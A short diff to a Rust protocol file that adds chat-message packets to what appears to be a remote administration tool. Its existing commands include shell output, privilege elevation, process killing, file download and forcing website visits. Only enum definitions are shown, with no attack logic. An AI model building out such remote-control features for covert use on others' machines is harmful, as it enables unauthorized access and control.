@@ -22,6 +22,7 @@ pub enum ServerboundPacket {
     ProcessList(ProcessList),
     ShellOutput(String),
     InputBoxResult(String),
+    ChatMessage(String),
 
     DonwloadFileResult(FileData),
 
@@ -55,6 +56,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::ProcessList(_) => "Process List",
             ServerboundPacket::ShellOutput(_) => "Shell Output",
             ServerboundPacket::InputBoxResult(_) => "Input Box Result",
+            ServerboundPacket::ChatMessage(_) => "Chat Message",
             ServerboundPacket::DonwloadFileResult(_) => "Donwload File Result",
             ServerboundPacket::DisksResult(_) => "Disks Result",
             ServerboundPacket::FileList(_) => "File List",
@@ -84,6 +86,9 @@ pub enum ClientboundPacket {
     ShowInputBox(InputBoxData),
     ElevateClient,
     ManageSystem(String),
+
+    SendChatMessage(String),
+    StopChat,
 
     GetProcessList,
     KillProcess(Process),
@@ -146,6 +151,8 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::VisitWebsite(_) => "Visit Website",
             ClientboundPacket::ShowMessageBox(_) => "Show MessageBox",
             ClientboundPacket::ShowInputBox(_) => "Show Input Box",
+            ClientboundPacket::SendChatMessage(_) => "Send Chat Message",
+            ClientboundPacket::StopChat => "Stop Chat",
             ClientboundPacket::ElevateClient => "Elevate Client",
             ClientboundPacket::ManageSystem(_) => "Manage System",
             ClientboundPacket::GetProcessList => "Get Process List",
